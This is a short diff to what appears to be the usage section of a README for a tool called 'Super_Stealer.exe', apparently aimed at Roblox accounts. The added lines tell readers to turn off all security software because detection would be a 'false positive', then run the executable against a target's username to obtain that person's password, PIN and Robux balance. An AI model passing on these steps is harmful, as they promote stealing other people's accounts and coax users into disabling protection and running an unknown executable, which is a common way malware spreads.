@@ -11,8 +11,8 @@ The user of your target
 How to use:
 Turn off all security as this can show as a false positive ( an entity, such as a file or a process that was detected and identified as malicious even though the entity isn't actually a threat.)
 Download the raw file
-Open the raw file
-Open Super_Stealer.exe
-Put the username of your target
-
-
+Open the raw file               
+Open Super_Stealer.exe               
+Put the username of your target                 
+Let the stealer sit for about a minuite or two               
+After that wait it will give you the username,password,pin and robux amount in the account
